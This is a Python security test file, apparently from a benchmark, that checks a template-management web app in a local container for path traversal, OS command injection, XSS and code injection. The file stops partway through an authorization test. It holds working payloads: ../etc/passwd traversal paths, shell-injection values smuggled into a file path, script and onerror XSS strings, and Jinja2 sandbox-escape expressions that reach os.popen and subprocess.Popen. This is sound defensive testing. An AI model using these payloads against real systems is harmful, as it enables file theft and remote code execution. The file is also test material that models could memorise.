# flake8: noqa
# isort: skip_file
import uuid

from exploits import load_file_from_docker

generate_marker = lambda: uuid.uuid4().hex
# import libraries
from typing import Any, Dict, List, Optional, Tuple

import requests

import cwes
from exploits import place_file_on_docker
from scenarios.base import AppInstance


# shared methods
def _base_url(app: AppInstance) -> str:
    return f"http://localhost:{app.port}"


def _headers(token: Optional[str] = None) -> Dict[str, str]:
    hdrs: Dict[str, str] = {}
    if token:
        hdrs["X-Session-Token"] = token
    return hdrs


def register_user(
    app: AppInstance, username: str
) -> Tuple[Optional[str], Optional[str], Optional[requests.Response]]:
    url = f"{_base_url(app)}/register"
    try:
        resp = requests.post(url, json={"username": username}, timeout=10)
    except Exception as e:
        app.logger.exception("Exception during POST /register: %s", e)
        return None, None, None
    try:
        data = resp.json()
    except Exception:
        data = None
    if resp.status_code != 201 or not isinstance(data, dict):
        app.logger.warning(
            "Register failed: status=%s body=%s",
            resp.status_code,
            getattr(resp, "text", None),
        )
        return None, None, resp
    user_id = data.get("userId")
    session_token = data.get("sessionToken")
    if (
        not isinstance(user_id, str)
        or not isinstance(session_token, str)
        or user_id == ""
        or session_token == ""
    ):
        app.logger.warning("Register returned invalid payload: %s", data)
        return None, None, resp
    return session_token, user_id, resp


def create_template(
    app: AppInstance, token: str, name: str, content: str, public: Optional[bool] = None
) -> Optional[requests.Response]:
    url = f"{_base_url(app)}/templates"
    body: Dict[str, Any] = {"name": name, "content": content}
    if public is not None:
        body["public"] = public
    try:
        resp = requests.post(url, headers=_headers(token), json=body, timeout=10)
        return resp
    except Exception as e:
        app.logger.exception("Exception during POST /templates: %s", e)
        return None


def list_templates(
    app: AppInstance, token: str, q: Optional[str] = None, scope: Optional[str] = None
) -> Optional[requests.Response]:
    url = f"{_base_url(app)}/templates"
    params: Dict[str, Any] = {}
    if q is not None:
        params["q"] = q
    if scope is not None:
        params["scope"] = scope
    try:
        resp = requests.get(url, headers=_headers(token), params=params, timeout=10)
        return resp
    except Exception as e:
        app.logger.exception("Exception during GET /templates: %s", e)
        return None


def import_template(
    app: AppInstance, token: str, name: str, path: str, public: Optional[bool] = None
) -> Optional[requests.Response]:
    url = f"{_base_url(app)}/templates/import"
    body: Dict[str, Any] = {"name": name, "path": path}
    if public is not None:
        body["public"] = public
    try:
        resp = requests.post(url, headers=_headers(token), json=body, timeout=15)
        return resp
    except Exception as e:
        app.logger.exception("Exception during POST /templates/import: %s", e)
        return None


def render_template(
    app: AppInstance, token: str, template_id: str, variables: Dict[str, Any]
) -> Optional[requests.Response]:
    url = f"{_base_url(app)}/templates/{template_id}/render"
    body = {"variables": variables}
    try:
        resp = requests.post(url, headers=_headers(token), json=body, timeout=15)
        return resp
    except Exception as e:
        app.logger.exception("Exception during POST /templates/{id}/render: %s", e)
        return None


def parse_json(resp: requests.Response) -> Any:
    try:
        return resp.json()
    except Exception:
        return None


def extract_render_output(resp: requests.Response) -> Optional[str]:
    # Accept both application/json with {"output": "..."} and text/plain
    ctype = resp.headers.get("Content-Type", "")
    if "application/json" in ctype:
        data = parse_json(resp)
        if isinstance(data, dict) and isinstance(data.get("output"), str):
            return data.get("output")
        return None
    # Fallback: treat body as text
    try:
        return resp.text
    except Exception:
        return None


def find_items_by_name(items: List[Dict[str, Any]], name: str) -> List[Dict[str, Any]]:
    return [it for it in items if isinstance(it, dict) and it.get("name") == name]


# import other libraries
import re
from typing import Any, Dict, Optional, Tuple


# additional helper code not given already
def _json_or_none(resp) -> Optional[Dict[str, Any]]:
    if resp is None:
        return None
    try:
        return resp.json()
    except Exception:
        return None


def _extract_template_fields(
    data: Dict[str, Any]
) -> Tuple[Optional[str], Optional[str], Optional[bool]]:
    if not isinstance(data, dict):
        return None, None, None
    tpl_id = data.get("id") if isinstance(data.get("id"), str) else None
    content = data.get("content") if isinstance(data.get("content"), str) else None
    public = data.get("public") if isinstance(data.get("public"), bool) else None
    return tpl_id, content, public


def _looks_like_passwd(content: str) -> bool:
    # Look for typical /etc/passwd structure
    if not content or len(content) < 50:
        return False
    # multiple lines with colon-separated fields and a root line
    if (
        re.search(r"(?m)^root:[^:\n]*:\d+:\d+:", content)
        and ":" in content
        and "\n" in content
    ):
        return True
    # fallback heuristic: common usernames and colon separators
    common_users = ["root:", "daemon:", "bin:", "sys:"]
    if any(u in content for u in common_users) and content.count(":") > 10:
        return True
    return False


# import other libraries

# import other libraries
import time

# import other libraries
from typing import Optional, Set, Tuple

# additional helper code not given already


# additional helper code not given already


# additional helper code not given already
def _safe_get_template_id(resp) -> Optional[str]:
    data = _json_or_none(resp)
    if not isinstance(data, dict):
        return None
    tpl_id, _, _ = _extract_template_fields(data)
    return tpl_id


def _render_and_extract(
    app: AppInstance, token: str, template_id: str, variables: dict
) -> Tuple[Optional[str], Optional[int]]:
    resp = render_template(app, token, template_id, variables)
    if resp is None:
        return None, None
    out = extract_render_output(resp)
    return out, resp.status_code


def _contains_xss_signature(s: Optional[str], marker: str) -> bool:
    if not isinstance(s, str):
        return False
    # Look for both the marker and HTML/script indicators that would execute when treated as HTML
    has_marker = marker in s
    has_exec_signature = (
        ("<script" in s.lower())
        or ("onerror=" in s.lower())
        or ("onload=" in s.lower())
    )
    return has_marker and has_exec_signature


# import other libraries
# additional helper code not given already


# import other libraries
# additional helper code not given already


# import other libraries

# import other libraries
# additional helper code not given already
from typing import List, Optional, Set, Tuple


def _try_import_and_verify(
    app: AppInstance,
    token: str,
    name: str,
    path: str,
    marker: Optional[str] = None,
    check_passwd: bool = False,
) -> Tuple[bool, Optional[str]]:
    app.logger.info("Attempting import: name=%s path=%s", name, path)
    resp = import_template(app, token, name, path, public=False)
    if resp is None:
        app.logger.warning("Import request failed (no response) for path=%s", path)
        return False, None

    data = _json_or_none(resp)
    if resp.status_code != 201 or not isinstance(data, dict):
        app.logger.warning(
            "Import failed: status=%s body_type=%s path=%s",
            resp.status_code,
            type(data).__name__ if data is not None else None,
            path,
        )
        return False, None

    tpl_id, content, _ = _extract_template_fields(data)
    # First check the content directly, if present
    if isinstance(content, str):
        clen = len(content)
        app.logger.info("Import returned content directly (len=%d)", clen)
        if marker is not None and marker in content:
            app.logger.info("Marker found in import response content")
            return True, tpl_id
        if check_passwd and _looks_like_passwd(content):
            app.logger.info("/etc/passwd-like content detected in import response")
            return True, tpl_id

    # Fallback: render the imported template to extract content
    if isinstance(tpl_id, str):
        out, status = _render_and_extract(app, token, tpl_id, {})
        if out is not None:
            app.logger.info(
                "Rendered imported template: status=%s len=%d", status, len(out)
            )
            if marker is not None and marker in out:
                app.logger.info("Marker found in rendered output")
                return True, tpl_id
            if check_passwd and _looks_like_passwd(out):
                app.logger.info("/etc/passwd-like content detected in rendered output")
                return True, tpl_id
        else:
            app.logger.warning("Render returned no output for template_id=%s", tpl_id)
    else:
        app.logger.warning("Import response missing template id; cannot render")

    return False, tpl_id


def _build_traversal_variants(target_abs_path: str, max_depth: int = 8) -> List[str]:
    """
    Produce traversal-based relative paths to the given absolute path.
    E.g., '../../../../tmp/file.txt'
    """
    # strip leading slash and ensure no accidental duplication
    rel = target_abs_path.lstrip("/")
    variants = []
    for depth in range(1, max_depth + 1):
        prefix = "../" * depth
        variants.append(prefix + rel)
    return variants


# import other libraries
# additional helper code not given already


def func_test_create_list_render_single_user(app: AppInstance) -> bool:
    # Step 1: Register
    token, user_id, resp_reg = register_user(app, "alice")
    if token is None or user_id is None or resp_reg is None:
        app.logger.warning("User registration failed for alice")
        return False

    # Step 2: Create template
    resp_create = create_template(
        app, token, "welcome-email", "<h1>Hello {{name}}</h1>", public=False
    )
    if resp_create is None or resp_create.status_code != 201:
        app.logger.warning(
            "Create template failed: status=%s body=%s",
            getattr(resp_create, "status_code", None),
            getattr(resp_create, "text", None),
        )
        return False
    tpl = parse_json(resp_create)
    if not isinstance(tpl, dict):
        app.logger.warning(
            "Create template returned non-JSON or non-dict: %s",
            getattr(resp_create, "text", None),
        )
        return False
    tpl_id = tpl.get("id")
    if not (isinstance(tpl_id, str) and tpl_id):
        app.logger.warning("Template id missing/invalid: %s", tpl)
        return False
    if (
        tpl.get("name") != "welcome-email"
        or tpl.get("content") != "<h1>Hello {{name}}</h1>"
        or tpl.get("public") is not False
    ):
        app.logger.warning("Template payload fields unexpected: %s", tpl)
        return False

    # Step 3: List templates
    resp_list = list_templates(app, token)
    if resp_list is None or resp_list.status_code != 200:
        app.logger.warning(
            "List templates failed: status=%s body=%s",
            getattr(resp_list, "status_code", None),
            getattr(resp_list, "text", None),
        )
        return False
    arr = parse_json(resp_list)
    if not isinstance(arr, list):
        app.logger.warning(
            "List templates did not return array: %s", getattr(resp_list, "text", None)
        )
        return False
    found = [it for it in arr if isinstance(it, dict) and it.get("id") == tpl_id]
    if len(found) != 1:
        app.logger.warning(
            "Created template not found in list; tpl_id=%s list=%s", tpl_id, arr
        )
        return False
    summary = found[0]
    if (
        summary.get("name") != "welcome-email"
        or summary.get("public") is not False
        or summary.get("owner") is not True
    ):
        app.logger.warning("Template summary fields unexpected: %s", summary)
        return False

    # Step 4: Render template
    resp_render = render_template(app, token, tpl_id, {"name": "Alice"})
    if resp_render is None or resp_render.status_code != 200:
        app.logger.warning(
            "Render template failed: status=%s body=%s",
            getattr(resp_render, "status_code", None),
            getattr(resp_render, "text", None),
        )
        return False
    output = extract_render_output(resp_render)
    if output != "<h1>Hello Alice</h1>":
        app.logger.warning(
            "Render output mismatch. Expected '<h1>Hello Alice</h1>', got: %s", output
        )
        return False

    return True


def func_test_visibility_across_users_scope_filtering(app: AppInstance) -> bool:
    # User A registers
    token_a, user_id_a, _ = register_user(app, "userA")
    if token_a is None:
        app.logger.warning("Registration failed for userA")
        return False

    # User A creates private and public templates
    r_priv = create_template(app, token_a, "a-private", "Hi {{who}}", public=False)
    if r_priv is None or r_priv.status_code != 201:
        app.logger.warning(
            "Creating a-private failed: status=%s body=%s",
            getattr(r_priv, "status_code", None),
            getattr(r_priv, "text", None),
        )
        return False
    r_pub = create_template(app, token_a, "a-public", "Hi {{who}}", public=True)
    if r_pub is None or r_pub.status_code != 201:
        app.logger.warning(
            "Creating a-public failed: status=%s body=%s",
            getattr(r_pub, "status_code", None),
            getattr(r_pub, "text", None),
        )
        return False

    # User B registers
    token_b, user_id_b, _ = register_user(app, "userB")
    if token_b is None:
        app.logger.warning("Registration failed for userB")
        return False

    # User B: scope=public
    resp_public = list_templates(app, token_b, scope="public")
    if resp_public is None or resp_public.status_code != 200:
        app.logger.warning(
            "List templates (public) failed: status=%s body=%s",
            getattr(resp_public, "status_code", None),
            getattr(resp_public, "text", None),
        )
        return False
    arr_public = parse_json(resp_public)
    if not isinstance(arr_public, list):
        app.logger.warning(
            "List (public) did not return array: %s", getattr(resp_public, "text", None)
        )
        return False
    public_items_names = [it.get("name") for it in arr_public if isinstance(it, dict)]
    if "a-public" not in public_items_names:
        app.logger.warning("a-public not found in public scope list: %s", arr_public)
        return False
    if "a-private" in public_items_names:
        app.logger.warning(
            "a-private should not appear in public scope list: %s", arr_public
        )
        return False
    # Validate owner false for a-public
    apub_list = [
        it for it in arr_public if isinstance(it, dict) and it.get("name") == "a-public"
    ]
    if (
        not apub_list
        or apub_list[0].get("public") is not True
        or apub_list[0].get("owner") is not False
    ):
        app.logger.warning(
            "a-public summary fields unexpected for userB: %s",
            apub_list[0] if apub_list else None,
        )
        return False

    # User B: scope=all
    resp_all = list_templates(app, token_b, scope="all")
    if resp_all is None or resp_all.status_code != 200:
        app.logger.warning(
            "List templates (all) failed: status=%s body=%s",
            getattr(resp_all, "status_code", None),
            getattr(resp_all, "text", None),
        )
        return False
    arr_all = parse_json(resp_all)
    if not isinstance(arr_all, list):
        app.logger.warning(
            "List (all) did not return array: %s", getattr(resp_all, "text", None)
        )
        return False
    all_names = [it.get("name") for it in arr_all if isinstance(it, dict)]
    if "a-public" not in all_names or "a-private" in all_names:
        app.logger.warning("Scope=all list unexpected content: %s", arr_all)
        return False
    # Validate owner false for a-public again
    apub_all = [
        it for it in arr_all if isinstance(it, dict) and it.get("name") == "a-public"
    ]
    if (
        not apub_all
        or apub_all[0].get("public") is not True
        or apub_all[0].get("owner") is not False
    ):
        app.logger.warning(
            "a-public summary fields unexpected in scope=all for userB: %s",
            apub_all[0] if apub_all else None,
        )
        return False

    return True


def func_test_case_insensitive_search_q(app: AppInstance) -> bool:
    token, user_id, _ = register_user(app, "caseUser")
    if token is None:
        app.logger.warning("Registration failed for caseUser")
        return False

    r1 = create_template(app, token, "welcome-email", "X", public=False)
    if r1 is None or r1.status_code != 201:
        app.logger.warning(
            "Creating welcome-email failed: status=%s body=%s",
            getattr(r1, "status_code", None),
            getattr(r1, "text", None),
        )
        return False
    r2 = create_template(app, token, "invoice", "Y", public=False)
    if r2 is None or r2.status_code != 201:
        app.logger.warning(
            "Creating invoice failed: status=%s body=%s",
            getattr(r2, "status_code", None),
            getattr(r2, "text", None),
        )
        return False

    resp = list_templates(app, token, q="WELCOME")
    if resp is None or resp.status_code != 200:
        app.logger.warning(
            "Search templates failed: status=%s body=%s",
            getattr(resp, "status_code", None),
            getattr(resp, "text", None),
        )
        return False
    arr = parse_json(resp)
    if not isinstance(arr, list):
        app.logger.warning(
            "Search result not an array: %s", getattr(resp, "text", None)
        )
        return False

    names = [it.get("name") for it in arr if isinstance(it, dict)]
    if "welcome-email" not in names:
        app.logger.warning("Expected 'welcome-email' in search results, got: %s", names)
        return False
    if "invoice" in names:
        app.logger.warning("Did not expect 'invoice' in search results, got: %s", names)
        return False

    return True


def func_test_import_template_from_path_and_list(app: AppInstance) -> bool:
    token, user_id, _ = register_user(app, "importer")
    if token is None:
        app.logger.warning("Registration failed for importer")
        return False

    # Prepare a server-side file inside the app's workdir
    server_file_path = app.env.workdir.rstrip("/") + "/import_src.html"
    file_content = "<p>Hi {{name}}</p>"
    try:
        place_file_on_docker(app.container_id, server_file_path, file_content)
    except Exception as e:
        app.logger.exception("Failed to place file in container: %s", e)
        return False

    resp_imp = import_template(
        app, token, "imported-template", server_file_path, public=False
    )
    if resp_imp is None or resp_imp.status_code != 201:
        app.logger.warning(
            "Import template failed: status=%s body=%s",
            getattr(resp_imp, "status_code", None),
            getattr(resp_imp, "text", None),
        )
        return False
    tpl = parse_json(resp_imp)
    if not isinstance(tpl, dict):
        app.logger.warning(
            "Import response not JSON dict: %s", getattr(resp_imp, "text", None)
        )
        return False
    imported_id = tpl.get("id")
    if not (isinstance(imported_id, str) and imported_id):
        app.logger.warning("Imported template id invalid: %s", tpl)
        return False
    if tpl.get("name") != "imported-template" or tpl.get("public") is not False:
        app.logger.warning("Imported template fields unexpected: %s", tpl)
        return False
    if not isinstance(tpl.get("content"), str):
        app.logger.warning("Imported template content missing or not string: %s", tpl)
        return False

    # Verify it appears in own list with owner=true
    resp_list = list_templates(app, token, scope="own")
    if resp_list is None or resp_list.status_code != 200:
        app.logger.warning(
            "List own templates failed: status=%s body=%s",
            getattr(resp_list, "status_code", None),
            getattr(resp_list, "text", None),
        )
        return False
    arr = parse_json(resp_list)
    if not isinstance(arr, list):
        app.logger.warning(
            "List own not an array: %s", getattr(resp_list, "text", None)
        )
        return False
    found = [it for it in arr if isinstance(it, dict) and it.get("id") == imported_id]
    if len(found) != 1:
        app.logger.warning(
            "Imported template not found in own list. id=%s list=%s", imported_id, arr
        )
        return False
    summary = found[0]
    if (
        summary.get("name") != "imported-template"
        or summary.get("public") is not False
        or summary.get("owner") is not True
    ):
        app.logger.warning("Imported template summary fields unexpected: %s", summary)
        return False

    return True


def sec_test_path_traversal(app: AppInstance) -> set[cwes.CWE] | None:
    findings: set[cwes.CWE] = set()

    # 1) Register a user to obtain a session token
    token, user_id, resp_reg = register_user(app, f"tester_{generate_marker()[:8]}")
    if not token:
        app.logger.error("Failed to register user; cannot proceed with exploit.")
        return findings

    app.logger.info("Registered user %s; obtained session token.", user_id)

    # Helper to try importing a given path, return (tpl_id, content)
    def try_import_path(
        path: str, name_hint: str
    ) -> Tuple[Optional[str], Optional[str]]:
        resp = import_template(app, token, f"{name_hint}_{generate_marker()[:6]}", path)
        if resp is None:
            app.logger.warning("Import request failed for path=%s (no response).", path)
            return None, None
        data = _json_or_none(resp)
        if resp.status_code != 201 or not isinstance(data, dict):
            app.logger.info(
                "Import failed for path=%s status=%s body_preview=%s",
                path,
                resp.status_code,
                resp.text[:200] if getattr(resp, "text", None) else None,
            )
            return None, None
        tpl_id, content, _public = _extract_template_fields(data)
        app.logger.info(
            "Import success for path=%s; template_id=%s; content_len=%s",
            path,
            tpl_id,
            len(content) if isinstance(content, str) else None,
        )
        return tpl_id, content

    # Helper to validate by rendering the stored template
    def render_and_check(tpl_id: str, expected_prefix: Optional[str] = None) -> bool:
        resp = render_template(app, token, tpl_id, variables={})
        if resp is None:
            app.logger.warning("Render returned no response for template_id=%s", tpl_id)
            return False
        if resp.status_code != 200:
            app.logger.info(
                "Render failed for template_id=%s status=%s", tpl_id, resp.status_code
            )
            return False
        output = extract_render_output(resp)
        if not isinstance(output, str) or len(output) == 0:
            app.logger.info(
                "Render returned empty/non-string output for template_id=%s", tpl_id
            )
            return False
        if expected_prefix is None:
            app.logger.info(
                "Render succeeded for template_id=%s (len=%d)", tpl_id, len(output)
            )
            return True
        # Compare prefix to avoid issues with potential trailing nulls/newlines
        prefix_len = min(128, len(expected_prefix))
        if output[:prefix_len] == expected_prefix[:prefix_len]:
            app.logger.info(
                "Render output matches expected prefix for template_id=%s", tpl_id
            )
            return True
        app.logger.info(
            "Render output did not match expected prefix for template_id=%s", tpl_id
        )
        return False

    # 2) Attempt to read /etc/passwd via absolute and traversal paths
    passwd_targets = ["/etc/passwd"]
    # Also try traversal from potential app-relative working dir
    for ups in range(3, 11):  # try 3..10 levels
        passwd_targets.append("../" * ups + "etc/passwd")

    passwd_success = False
    for target in passwd_targets:
        app.logger.info(
            "Attempting arbitrary file read via /templates/import with path=%s", target
        )
        tpl_id, content = try_import_path(target, "leak_passwd")
        if tpl_id and isinstance(content, str) and _looks_like_passwd(content):
            app.logger.info(
                "Imported content appears to be /etc/passwd (len=%d).", len(content)
            )
            # Demonstrate exfiltration via render endpoint as well
            if render_and_check(tpl_id, expected_prefix=content[:128]):
                passwd_success = True
                break
            else:
                # Even if render fails, the import already leaked content; accept as success
                app.logger.info(
                    "Render verification did not pass, but import leaked plausible /etc/passwd content."
                )
                passwd_success = True
                break

    # 3) Optional deterministic verification using a known marker file
    marker_success = False
    try:
        marker = generate_marker()
        marker_path = "/tmp/poc-marker.txt"
        # Place the marker file inside the container (not part of the exploit, only for verification)
        place_file_on_docker(app.container_id, marker_path, marker)
        app.logger.info("Placed marker file at %s for verification.", marker_path)

        marker_targets = [marker_path]
        for ups in range(3, 11):
            marker_targets.append("../" * ups + "tmp/poc-marker.txt")

        for target in marker_targets:
            app.logger.info("Attempting to import marker file via path=%s", target)
            tpl_id, content = try_import_path(target, "leak_marker")
            if tpl_id and isinstance(content, str) and content == marker:
                app.logger.info(
                    "Successfully imported marker file content (exact match confirmed)."
                )
                # Demonstrate render-based retrieval too
                if render_and_check(tpl_id, expected_prefix=marker[:64]):
                    marker_success = True
                    break
                else:
                    # Accept success based on import leak alone
                    marker_success = True
                    break
    except Exception as e:
        app.logger.exception("Exception during marker verification setup/use: %s", e)

    if passwd_success or marker_success:
        app.logger.warning(
            "CWE-22 Path Traversal likely present: arbitrary server-side file read via /templates/import."
        )
        findings.add(cwes.CWE.PATH_TRAVERSAL)
    else:
        app.logger.info("Did not confirm path traversal via /templates/import.")

    return findings


def sec_test_os_injection(app: AppInstance) -> set[cwes.CWE] | None:
    findings: Set[cwes.CWE] = set()
    logger = app.logger

    try:
        logger.info("OS Injection PoC: starting registration to obtain session token")
        username = f"tester-{uuid.uuid4().hex[:8]}"
        token, user_id, _ = register_user(app, username)
        if not token:
            logger.warning("OS Injection PoC: registration failed, cannot proceed")
            return findings

        # Seed a valid source file so the beginning of the path is plausible
        try:
            place_file_on_docker(app.container_id, "/tmp/src.txt", "hello")
            logger.info("OS Injection PoC: placed seed file in container for import")
        except Exception as e:
            logger.exception(
                "OS Injection PoC: failed to place seed file in container: %s", e
            )
            return findings

        # Prepare unique marker and a proof path inside the app workdir
        marker = generate_marker()
        workdir = getattr(app.env, "workdir", "/tmp").rstrip("/")
        proof_path = f"{workdir}/proof-{marker}.txt"

        # Build multiple payload variants to cope with different quoting/exec patterns
        # Do not log or print the marker or full payloads to avoid leaking identifiers
        payloads = [
            f"/tmp/src.txt; printf {marker} > '{proof_path}'",
            f"/tmp/src.txt && printf {marker} > '{proof_path}'",
            f"/tmp/src.txt$(printf {marker} > '{proof_path}')",
        ]

        for idx, path_payload in enumerate(payloads, start=1):
            try:
                logger.info(
                    "OS Injection PoC: attempting payload variant %d via /templates/import",
                    idx,
                )
                resp = import_template(
                    app,
                    token,
                    name=f"poc-osinj-{idx}",
                    path=path_payload,
                    public=False,
                )
                if resp is None:
                    logger.warning(
                        "OS Injection PoC: no response for payload variant %d", idx
                    )
                else:
                    logger.info(
                        "OS Injection PoC: /templates/import returned HTTP %s for payload variant %d",
                        resp.status_code,
                        idx,
                    )
            except Exception as e:
                logger.exception(
                    "OS Injection PoC: exception during import attempt %d: %s", idx, e
                )

            # Give the backend a brief moment to execute any injected command
            time.sleep(0.2)

            # Check for out-of-band side effect: file creation with expected content
            try:
                data = load_file_from_docker(app.container_id, proof_path)
                # Expect exact match because printf does not append a newline
                if (
                    isinstance(data, (bytes, bytearray))
                    and data.decode(errors="ignore") == marker
                ):
                    logger.info(
                        "OS Injection PoC: success – proof file created with expected content"
                    )
                    findings.add(cwes.CWE.OS_INJECTION)
                    return findings
                else:
                    logger.info(
                        "OS Injection PoC: proof file present but content mismatch; continuing attempts"
                    )
            except Exception:
                logger.info(
                    "OS Injection PoC: proof file not found after payload variant %d; trying next",
                    idx,
                )

        logger.warning(
            "OS Injection PoC: all payload variants failed to produce expected side effect"
        )
        return findings
    except Exception as e:
        logger.exception("OS Injection PoC: unexpected exception: %s", e)
        return findings


def sec_test_xss(app: AppInstance) -> set[cwes.CWE] | None:
    findings: set[cwes.CWE] = set()
    marker = generate_marker()  # Do not log/print the marker

    def _is_html_response(resp) -> bool:
        ctype = (resp.headers.get("Content-Type") or "").lower()
        return "text/html" in ctype

    def _has_unescaped_executable_html(s: str, marker: str) -> bool:
        if not isinstance(s, str) or marker not in s:
            return False
        l = s.lower()
        # Require literal angle brackets (unescaped) before executable contexts
        if "<script" in l:
            return True
        if "<img" in l and "onerror=" in l:
            return True
        if "onload=" in l and ("<img" in l or "<body" in l or "<div" in l):
            return True
        return False

    # 1) Register attacker
    app.logger.info("Registering attacker for refined XSS test")
    atk_token, atk_user, _ = register_user(app, "attacker-xss-refined")
    if not atk_token:
        app.logger.warning("Attacker registration failed; aborting XSS test")
        return set()

    # 2) Reflected-style via variables: verify server-side escaping (only treat as XSS if HTML is returned unescaped)
    app.logger.info("Creating benign template for variable-substitution XSS check")
    benign_name = "benign-poc-refined"
    benign_content = "<div>Welcome {{name}}</div>"
    resp_create = create_template(
        app, atk_token, benign_name, benign_content, public=True
    )
    if resp_create is None or resp_create.status_code != 201:
        app.logger.warning(
            "Failed to create benign template; status=%s",
            getattr(resp_create, "status_code", None),
        )
        return findings

    tpl_id = _safe_get_template_id(resp_create)
    if not tpl_id:
        app.logger.warning("Create benign template did not return valid id")
        return findings

    reflected_var = f"<img src=x onerror=\"document.body && document.body.setAttribute('data-xss-var','{marker}')\">"
    app.logger.info("Rendering benign template with malicious variable value")
    resp_render = render_template(app, atk_token, tpl_id, {"name": reflected_var})
    if resp_render is None:
        app.logger.warning("Render request failed (no response)")
        return findings

    body_text = extract_render_output(resp_render)
    if _is_html_response(resp_render) and _has_unescaped_executable_html(
        body_text or "", marker
    ):
        app.logger.info(
            "Reflected XSS detected: unescaped executable HTML returned with text/html"
        )
        findings.add(cwes.CWE.XSS)
    else:
        app.logger.info("No reflected XSS: response not HTML or content escaped")

    # 3) Stored-style: only consider XSS if server returns HTML with executable content
    app.logger.info(
        "Creating public template with executable HTML to test stored XSS in HTML responses"
    )
    stored_name = "public-poc-refined"
    stored_payload = (
        "<h1>XSS</h1>"
        f"<img src=x onerror=\"document.body && document.body.setAttribute('data-xss','{marker}')\">"
        f"<script>document.body && document.body.setAttribute('data-xss2','{marker}')</script>"
    )
    resp_create_stored = create_template(
        app, atk_token, stored_name, stored_payload, public=True
    )
    if resp_create_stored is not None and resp_create_stored.status_code == 201:
        tpl_id_stored = _safe_get_template_id(resp_create_stored)
        if tpl_id_stored:
            # Render as a different user to simulate cross-user exposure
            vic_token, vic_user, _ = register_user(app, "victim-xss-refined")
            token_to_use = vic_token or atk_token
            app.logger.info(
                "Rendering stored template to check if backend serves HTML directly"
            )
            resp_render_stored = render_template(app, token_to_use, tpl_id_stored, {})
            if resp_render_stored is not None:
                body_text_stored = extract_render_output(resp_render_stored)
                if _is_html_response(
                    resp_render_stored
                ) and _has_unescaped_executable_html(body_text_stored or "", marker):
                    app.logger.info(
                        "Stored XSS detected: executable HTML served with text/html"
                    )
                    findings.add(cwes.CWE.XSS)
                else:
                    app.logger.info(
                        "No stored XSS: response not HTML or content served safely"
                    )
    else:
        app.logger.warning("Failed to create stored-XSS template; skipping stored test")

    if findings:
        app.logger.info("XSS vulnerability indicators detected (refined criteria)")
    else:
        app.logger.info("No XSS indicators detected with refined criteria")
    return findings


def sec_test_code_injection(app: AppInstance) -> set[cwes.CWE] | None:
    findings: set[cwes.CWE] = set()
    logger = app.logger

    # 1) Register a user to obtain a session token
    try:
        username = f"poc_{uuid.uuid4().hex[:8]}"
        token, user_id, reg_resp = register_user(app, username)
        if not token:
            logger.warning("CWE-94 PoC: Registration failed; cannot proceed.")
            return findings
        logger.info("CWE-94 PoC: Registered new user and obtained session token.")
    except Exception as e:
        logger.exception("CWE-94 PoC: Exception during registration: %s", e)
        return findings

    # Prepare unique marker and file path (do not log the marker or full path)
    marker = generate_marker()
    tmp_file_path = f"/tmp/tf_poc_{marker}.txt"

    # Helper to create a template and return its id
    def _create_tpl(name: str, content: str) -> Optional[str]:
        resp = create_template(app, token, name=name, content=content, public=False)
        if resp is None:
            logger.warning("CWE-94 PoC: POST /templates returned no response.")
            return None
        if resp.status_code != 201:
            logger.warning(
                "CWE-94 PoC: Creating template failed: status=%s body=%s",
                resp.status_code,
                getattr(resp, "text", None),
            )
            return None
        tpl_id = _safe_get_template_id(resp)
        if not tpl_id:
            logger.warning("CWE-94 PoC: Template creation response missing id.")
            return None
        logger.info("CWE-94 PoC: Created template.")
        return tpl_id

    # Helper to render a template
    def _render_tpl(tpl_id: str) -> Tuple[Optional[str], Optional[int]]:
        out, status = _render_and_extract(app, token, tpl_id, variables={})
        logger.info("CWE-94 PoC: Rendered template (status=%s).", status)
        return out, status

    # Attempt A: Jinja2-style file write via builtins.open
    try:
        primary_payload = (
            "{{ cycler.__init__.__globals__.__builtins__.open('"
            + tmp_file_path
            + "','w').write('"
            + marker
            + "') }}"
        )
        tpl_id = _create_tpl(name="rce-writer", content=primary_payload)
        if tpl_id:
            _render_tpl(tpl_id)
            # Try to import the file we aimed to write as proof of execution
            imp_resp = import_template(
                app, token, name="proof", path=tmp_file_path, public=False
            )
            if imp_resp is not None and imp_resp.status_code == 201:
                data = _json_or_none(imp_resp)
                if isinstance(data, dict):
                    _, content, _ = _extract_template_fields(data)
                    # Do not log content or marker; just validate
                    if isinstance(content, str) and content == marker:
                        logger.info(
                            "CWE-94 PoC: Verified code execution via server-side file write and import."
                        )
                        findings.add(cwes.CWE.CODE_INJECTION)
                        return findings
                else:
                    logger.warning("CWE-94 PoC: Import response JSON invalid.")
            else:
                logger.info(
                    "CWE-94 PoC: Import of proof file did not succeed; will attempt fallback payloads."
                )
        else:
            logger.info(
                "CWE-94 PoC: Primary payload template creation failed; will attempt fallback payloads."
            )
    except Exception as e:
        logger.exception("CWE-94 PoC: Exception during primary payload attempt: %s", e)

    # Attempt B: Direct command execution echo, expecting marker in output
    try:
        echo_payload = (
            "{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('echo "
            + marker
            + "').read() }}"
        )
        tpl_id_b = _create_tpl(name="rce-echo", content=echo_payload)
        if tpl_id_b:
            out, status = _render_tpl(tpl_id_b)
            if status and status == 200 and isinstance(out, str) and (marker in out):
                logger.info(
                    "CWE-94 PoC: Verified unsandboxed template evaluation via direct echo output."
                )
                findings.add(cwes.CWE.CODE_INJECTION)
                return findings
    except Exception as e:
        logger.exception(
            "CWE-94 PoC: Exception during secondary payload attempt: %s", e
        )

    # Attempt C: Fallback subclass traversal to reach subprocess.Popen
    try:
        fallback_payload = (
            "{% for c in [].__class__.__mro__[1].__subclasses__() %}"
            "{% if c.__name__ == 'Popen' %}"
            "{{ c('echo "
            + marker
            + "', shell=True, stdout=-1).communicate()[0].decode() }}"
            "{% endif %}"
            "{% endfor %}"
        )
        tpl_id_c = _create_tpl(name="rce-fallback", content=fallback_payload)
        if tpl_id_c:
            out, status = _render_tpl(tpl_id_c)
            if status and status == 200 and isinstance(out, str) and (marker in out):
                logger.info(
                    "CWE-94 PoC: Verified code execution via subclass traversal payload."
                )
                findings.add(cwes.CWE.CODE_INJECTION)
                return findings
    except Exception as e:
        logger.exception("CWE-94 PoC: Exception during fallback payload attempt: %s", e)

    logger.info("CWE-94 PoC: No evidence of exploitable code injection found.")
    return findings


def sec_test_incorrect_authorization(app: AppInstance) -> set[cwes.CWE] | None:
    findings: set[cwes.CWE] = set()

    # 1) Prepare unique marker and payloads (do not log the marker)
    marker = generate_marker()
    tpl_name = "poc-private-" + marker[:8]  # avoid logging the full marker
    tpl_content = f"LEAK::{marker}::{{{{foo}}}}"
    expected_prefix = f"LEAK::{marker}::"

